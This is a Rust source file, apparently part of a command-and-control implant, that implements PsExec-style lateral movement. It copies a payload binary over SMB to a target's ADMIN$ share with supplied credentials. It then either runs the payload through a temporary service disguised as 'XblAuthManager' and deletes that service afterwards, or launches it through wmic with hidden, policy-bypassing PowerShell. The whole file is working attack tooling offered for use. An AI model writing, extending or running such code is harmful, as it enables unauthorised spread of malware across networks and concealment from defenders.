//! PsExec jump modules — deploy P2P child via SMB service creation.
//!
//! psexec:     Copy binary to ADMIN$ → create+start service → cleanup
//! psexec_psh: Copy binary via SMB → run via powershell -ep bypass

use super::{JumpParams, JumpResult};

#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
pub fn execute_svc(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target  = &params.target;
    let user    = &params.user;
    let pass    = &params.password;
    let hash    = &params.hash;
    let service = &params.service;

    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }

    let svc_name = if service.is_empty() { "XblAuthManager" } else { service.as_str() };
    let remote_exe = format!("\\\\{}\\ADMIN$\\{}.exe", target, params.child_session_id);

    // Copy binary to ADMIN$ share
    let copy_result = smb_copy(target, user, pass, hash, payload, &remote_exe);
    if let Err(e) = copy_result {
        return JumpResult::Failed { error: format!("SMB copy failed: {}", e) };
    }

    // Create and start service via sc.exe
    let sc_create = Command::new("cmd")
        .args(["/c", &format!(
            "sc \\\\{} create {} binPath= \"C:\\Windows\\{}\" start= demand",
            target, svc_name, format!("{}.exe", params.child_session_id)
        )])
        .output();

    match sc_create {
        Err(e) => return JumpResult::Failed { error: format!("sc create failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return JumpResult::Failed { error: format!("sc create error: {}", stderr.trim()) };
        }
        _ => {}
    }

    let sc_start = Command::new("cmd")
        .args(["/c", &format!("sc \\\\{} start {}", target, svc_name)])
        .output();

    // Service may return error 1053 (timeout) but agent still runs — that's OK
    if let Ok(out) = &sc_start {
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            if !stderr.contains("1053") {
                crate::dlog!("jump", "sc start warning: {}", stderr.trim());
            }
        }
    }

    // Cleanup: delete service (agent is already running as a detached process)
    let _ = Command::new("cmd")
        .args(["/c", &format!("sc \\\\{} delete {}", target, svc_name)])
        .output();

    JumpResult::Success { remote_path: remote_exe }
}

#[cfg(windows)]
pub fn execute_psh(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target = &params.target;

    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }

    let remote_path = format!("\\\\{}\\ADMIN$\\{}.exe", target, params.child_session_id);

    let copy_result = smb_copy(target, &params.user, &params.password, &params.hash, payload, &remote_path);
    if let Err(e) = copy_result {
        return JumpResult::Failed { error: format!("SMB copy failed: {}", e) };
    }

    // Execute via WMI process create (powershell)
    let psh_cmd = format!(
        "powershell -ep bypass -w hidden -c \"Start-Process 'C:\\Windows\\{}.exe' -WindowStyle Hidden\"",
        params.child_session_id
    );

    let wmic = Command::new("cmd")
        .args(["/c", &format!(
            "wmic /node:{} process call create \"{}\"",
            target, psh_cmd
        )])
        .output();

    match wmic {
        Err(e) => JumpResult::Failed { error: format!("wmic exec failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            JumpResult::Failed { error: format!("wmic error: {}", stderr.trim()) }
        }
        Ok(_) => JumpResult::Success { remote_path },
    }
}

#[cfg(windows)]
pub fn smb_copy(target: &str, user: &str, pass: &str, _hash: &str,
                payload: &[u8], remote_path: &str) -> Result<(), String> {
    // Establish SMB session if credentials provided
    if !user.is_empty() && !pass.is_empty() {
        let net_use = Command::new("cmd")
            .args(["/c", &format!(
                "net use \\\\{}\\ADMIN$ /user:{} {} /persistent:no",
                target, user, pass
            )])
            .output()
            .map_err(|e| format!("net use: {}", e))?;

        if !net_use.status.success() {
            let stderr = String::from_utf8_lossy(&net_use.stderr);
            return Err(format!("net use failed: {}", stderr.trim()));
        }
    }

    // Write payload to remote path
    std::fs::write(remote_path, payload)
        .map_err(|e| format!("write {}: {}", remote_path, e))?;

    Ok(())
}
